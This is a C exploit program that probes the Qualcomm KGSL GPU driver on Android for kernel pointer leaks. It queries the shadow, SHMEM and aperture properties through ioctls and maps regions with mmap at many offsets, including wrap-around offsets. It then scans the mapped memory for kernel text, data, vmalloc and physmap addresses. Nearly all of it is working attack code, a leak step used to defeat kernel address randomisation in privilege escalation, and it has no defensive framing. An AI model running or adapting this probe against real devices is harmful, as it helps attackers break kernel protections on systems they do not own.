/*
 * KGSL Kernel Pointer Leak via Shadow Mapping
 *
 * Target: Property 0x02 DEVICE_SHADOW reports 0xeffff000 / 0x8000
 * This could be a physical address or GPU-visible mapping
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

#define KGSL_IOC_TYPE 0x09
#define IOCTL_KGSL_DEVICE_GETPROPERTY _IOWR(KGSL_IOC_TYPE, 0x02, struct kgsl_device_getproperty)
#define IOCTL_KGSL_SHAREDMEM_FROM_VMALLOC _IOWR(KGSL_IOC_TYPE, 0x25, struct kgsl_sharedmem_from_vmalloc)

struct kgsl_device_getproperty
{
    unsigned int type;
    void *value;
    unsigned long sizebytes;
};

struct kgsl_sharedmem_from_vmalloc
{
    unsigned long gpuaddr;
    unsigned int hostptr;
    unsigned int flags;
};

// KGSL property types
#define KGSL_PROP_DEVICE_SHADOW 0x02
#define KGSL_PROP_SHMEM 0x04
#define KGSL_PROP_SHMEM_APERTURES 0x05
#define KGSL_PROP_VERSION 0x12

// Shadow info structure
struct kgsl_shadowprop
{
    unsigned long gpuaddr;
    unsigned long size;
    unsigned int flags;
};

void hexdump(const void *data, size_t size, unsigned long base)
{
    const unsigned char *p = data;
    size_t i, j;

    for (i = 0; i < size; i += 16)
    {
        printf("%08lx: ", base + i);

        for (j = 0; j < 16; j++)
        {
            if (i + j < size)
                printf("%02x ", p[i + j]);
            else
                printf("   ");
            if (j == 7)
                printf(" ");
        }

        printf(" |");
        for (j = 0; j < 16 && i + j < size; j++)
        {
            printf("%c", (p[i + j] >= 32 && p[i + j] < 127) ? p[i + j] : '.');
        }
        printf("|\n");
    }
}

void analyze_for_pointers(const void *data, size_t size, const char *name)
{
    const unsigned long *p = data;
    size_t count = size / sizeof(unsigned long);

    printf("\n[*] Analyzing %s for kernel pointers:\n", name);

    for (size_t i = 0; i < count; i++)
    {
        unsigned long val = p[i];

        // Look for kernel text pointers (0xffffff80xxxxxxxx)
        if ((val & 0xFFFFFFFF00000000ULL) == 0xffffff8000000000ULL)
        {
            printf("  [+%zu] Potential kernel text: 0x%016lx\n", i * 8, val);
        }
        // Look for kernel data pointers (0xffffffc0xxxxxxxx)
        else if ((val & 0xFFFFFFFF00000000ULL) == 0xffffffc000000000ULL)
        {
            printf("  [+%zu] Potential kernel data: 0x%016lx\n", i * 8, val);
        }
        // Look for vmalloc area (0xffffffbfxxxxxxxx)
        else if ((val & 0xFFFFFFFF00000000ULL) == 0xffffffbf00000000ULL)
        {
            printf("  [+%zu] Potential vmalloc: 0x%016lx\n", i * 8, val);
        }
        // Look for physmap (0xfffffffexxxxxxxx)
        else if ((val & 0xFFFFFFFF00000000ULL) == 0xfffffffe00000000ULL)
        {
            printf("  [+%zu] Potential physmap: 0x%016lx\n", i * 8, val);
        }
        // Look for userspace-ish but high (could be leaks)
        else if ((val & 0xFFFF000000000000ULL) == 0xFFFF000000000000ULL)
        {
            printf("  [+%zu] Potential high addr: 0x%016lx\n", i * 8, val);
        }
    }
}

int main()
{
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    printf("╔═══════════════════════════════════════════════════════════════╗\n");
    printf("║  KGSL Shadow/SHMEM Kernel Pointer Leak                         ║\n");
    printf("╚═══════════════════════════════════════════════════════════════╝\n");

    int fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0)
    {
        perror("[-] Failed to open /dev/kgsl-3d0");
        return 1;
    }

    // ============ Get Shadow Info ============
    printf("\n=== Device Shadow Property ===\n");
    struct kgsl_shadowprop shadow = {0};
    struct kgsl_device_getproperty prop = {0};
    prop.type = KGSL_PROP_DEVICE_SHADOW;
    prop.value = &shadow;
    prop.sizebytes = sizeof(shadow);

    if (ioctl(fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &prop) == 0)
    {
        printf("[+] Shadow gpuaddr: 0x%lx\n", shadow.gpuaddr);
        printf("[+] Shadow size: 0x%lx\n", shadow.size);
        printf("[+] Shadow flags: 0x%x\n", shadow.flags);

        // Try to mmap the shadow region
        if (shadow.gpuaddr != 0 && shadow.size != 0)
        {
            printf("[*] Attempting to mmap shadow region...\n");

            // Try various mmap offsets
            unsigned long offsets[] = {
                shadow.gpuaddr,
                shadow.gpuaddr & 0xFFFFFFFF,
                0,
                shadow.size,
                0x1000,
            };

            for (int i = 0; i < sizeof(offsets) / sizeof(offsets[0]); i++)
            {
                void *map = mmap(NULL, shadow.size > 0 ? shadow.size : 0x8000,
                                 PROT_READ, MAP_SHARED, fd, offsets[i]);
                if (map != MAP_FAILED)
                {
                    printf("[+] Shadow mmap succeeded with offset 0x%lx\n", offsets[i]);
                    hexdump(map, 256, 0);
                    analyze_for_pointers(map, shadow.size > 0 ? shadow.size : 0x8000, "shadow");
                    munmap(map, shadow.size > 0 ? shadow.size : 0x8000);
                    break;
                }
                else
                {
                    printf("[-] mmap offset 0x%lx failed: %s\n", offsets[i], strerror(errno));
                }
            }
        }
    }
    else
    {
        printf("[-] Get shadow property failed: %s\n", strerror(errno));
    }

    // ============ Get SHMEM Info ============
    printf("\n=== SHMEM Property ===\n");
    unsigned char shmem_buf[256] = {0};
    prop.type = KGSL_PROP_SHMEM;
    prop.value = shmem_buf;
    prop.sizebytes = sizeof(shmem_buf);

    if (ioctl(fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &prop) == 0)
    {
        printf("[+] SHMEM property retrieved:\n");
        hexdump(shmem_buf, 64, 0);
        analyze_for_pointers(shmem_buf, sizeof(shmem_buf), "shmem");
    }
    else
    {
        printf("[-] Get shmem property failed: %s\n", strerror(errno));
    }

    // ============ Get SHMEM Apertures ============
    printf("\n=== SHMEM Apertures ===\n");
    unsigned char aperture_buf[256] = {0};
    prop.type = KGSL_PROP_SHMEM_APERTURES;
    prop.value = aperture_buf;
    prop.sizebytes = sizeof(aperture_buf);

    if (ioctl(fd, IOCTL_KGSL_DEVICE_GETPROPERTY, &prop) == 0)
    {
        printf("[+] Apertures retrieved:\n");
        hexdump(aperture_buf, 64, 0);
        analyze_for_pointers(aperture_buf, sizeof(aperture_buf), "apertures");
    }
    else
    {
        printf("[-] Get apertures failed: %s\n", strerror(errno));
    }

    // ============ Try to leak via SHAREDMEM_FROM_VMALLOC ============
    printf("\n=== SHAREDMEM_FROM_VMALLOC Probe ===\n");
    struct kgsl_sharedmem_from_vmalloc vmalloc_req = {0};
    vmalloc_req.hostptr = 0;
    vmalloc_req.flags = 0;

    if (ioctl(fd, IOCTL_KGSL_SHAREDMEM_FROM_VMALLOC, &vmalloc_req) == 0)
    {
        printf("[+] gpuaddr: 0x%lx\n", vmalloc_req.gpuaddr);
    }
    else
    {
        printf("[-] SHAREDMEM_FROM_VMALLOC failed: %s\n", strerror(errno));
    }

    // ============ Scan all mmap offsets for leaks ============
    printf("\n=== Exhaustive mmap offset scan ===\n");
    printf("[*] Scanning mmap offsets for kernel pointer leaks...\n");

    int leaks_found = 0;
    // Scan likely offset ranges
    for (unsigned long offset = 0; offset < 0x10000; offset += 0x1000)
    {
        void *map = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, fd, offset);
        if (map != MAP_FAILED)
        {
            // Check for kernel pointers in mapped memory
            unsigned long *p = map;
            for (int i = 0; i < 0x1000 / 8; i++)
            {
                unsigned long val = p[i];
                if ((val & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL ||
                    (val & 0xFFFFFFFF00000000ULL) == 0xffffffc000000000ULL)
                {
                    if (leaks_found < 10)
                    {
                        printf("[+] Offset 0x%lx+0x%x: 0x%016lx\n", offset, i * 8, val);
                    }
                    leaks_found++;
                }
            }
            munmap(map, 0x1000);
        }
    }

    printf("[*] Total potential kernel pointers found: %d\n", leaks_found);

    // ============ Try negative offsets (wrap-around) ============
    printf("\n=== Negative offset wrap-around test ===\n");
    // Test large offsets that might wrap around
    unsigned long neg_offsets[] = {
        0xFFFFF000,            // -0x1000
        0xFFFFE000,            // -0x2000
        0x80000000,            // 2GB
        0x100000000ULL,        // 4GB
        0xFFFFFFFFFFFF0000ULL, // Near max
    };

    for (int i = 0; i < sizeof(neg_offsets) / sizeof(neg_offsets[0]); i++)
    {
        void *map = mmap(NULL, 0x1000, PROT_READ, MAP_SHARED, fd, neg_offsets[i]);
        if (map != MAP_FAILED)
        {
            printf("[+] Large offset 0x%lx mapped!\n", neg_offsets[i]);
            hexdump(map, 64, 0);
            munmap(map, 0x1000);
        }
    }

    close(fd);
    printf("\n=== Analysis complete ===\n");

    return 0;
}
